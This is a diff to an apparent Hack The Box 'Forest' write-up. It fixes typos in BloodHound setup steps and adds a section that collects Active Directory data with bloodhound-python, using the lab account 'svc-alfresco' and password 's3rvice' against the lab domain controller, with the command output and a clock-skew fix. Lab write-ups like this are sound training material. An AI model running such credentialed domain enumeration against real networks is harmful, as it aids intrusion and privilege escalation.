@@ -422,9 +422,9 @@ Since we're already inside the target machine, we can begin gathering Active Dir
 
 Installing this tool can be a bit tricky if it's your first time.
 
-To facilitate this process, you can follow up this step by step:
+To make this easier, follow this step by step guide:
 
-- 1.- Create a directory to keep in all the installation resources.
+- 1.- Create a directory to store all the installation resources.
 
 <br />
 
@@ -434,7 +434,7 @@ mkdir BloodHound; cd BloodHound
 
 <br />
 
-- 2.- Get the `BloudHound-cli` compressed file:
+- 2.- Get the `BloodHound-cli` compressed file:
 
 <br />
 
@@ -497,3 +497,98 @@ bloodhound-cli
 ![4](../../../assets/images/Forest/4.png)
 
 <br />
+
+As shown, we need to upload a file with our Windows system target information.
+
+<br />
+
+### bloodhound-python:
+
+<br />
+
+To collect this information remotely we will use [bloodhound-python](https://github.com/dirkjanm/BloodHound.py).
+
+The only command that we need to execute is the following:
+
+<br />
+
+```bash
+❯ bloodhound-python -u 'svc-alfresco' -p 's3rvice' -c All -d htb.local -ns 10.10.10.161 --zip
+INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
+INFO: Found AD domain: htb.local
+INFO: Getting TGT for user
+INFO: Connecting to LDAP server: FOREST.htb.local
+WARNING: Kerberos auth to LDAP failed, trying NTLM
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 2 computers
+INFO: Connecting to LDAP server: FOREST.htb.local
+WARNING: Kerberos auth to LDAP failed, trying NTLM
+INFO: Found 32 users
+INFO: Found 76 groups
+INFO: Found 2 gpos
+INFO: Found 15 ous
+INFO: Found 20 containers
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: EXCH01.htb.local
+INFO: Querying computer: FOREST.htb.local
+WARNING: Failed to get service ticket for FOREST.htb.local, falling back to NTLM auth
+CRITICAL: CCache file is not found. Skipping...
+WARNING: DCE/RPC connection failed: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
+INFO: Done in 00M 17S
+INFO: Compressing output into 20250607140718_bloodhound.zip
+```
+
+<br />
+
+There was an error in the output: `"Clock skew too great"`.
+
+This error seems that we have a big time difference between our system and the target.
+
+The solution is to run this:
+
+<br />
+
+```bash
+❯ ntpdate 10.10.10.161
+2025-06-07 14:17:19.42273 (+0200) +490.993989 +/- 0.022237 10.10.10.161 s1 no-leap
+CLOCK: time stepped by 490.993989
+```
+
+<br />
+
+And run `bloodhound-python` again:
+
+<br />
+
+```bash
+❯ bloodhound-python -u 'svc-alfresco' -p 's3rvice' -c All -d htb.local -ns 10.10.10.161 --zip
+INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
+INFO: Found AD domain: htb.local
+INFO: Getting TGT for user
+INFO: Connecting to LDAP server: FOREST.htb.local
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 2 computers
+INFO: Connecting to LDAP server: FOREST.htb.local
+INFO: Found 32 users
+INFO: Found 76 groups
+INFO: Found 2 gpos
+INFO: Found 15 ous
+INFO: Found 20 containers
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: EXCH01.htb.local
+INFO: Querying computer: FOREST.htb.local
+INFO: Done in 00M 15S
+INFO: Compressing output into 20250607141748_bloodhound.zip
+```
+
+<br />
+
+Now that we have the `.zip` file, we can upload it to `BloodHound` for analysis clicking on `"Start by uploading your data"` and `"Upload File(s)"`.
+
+<br />
+
+
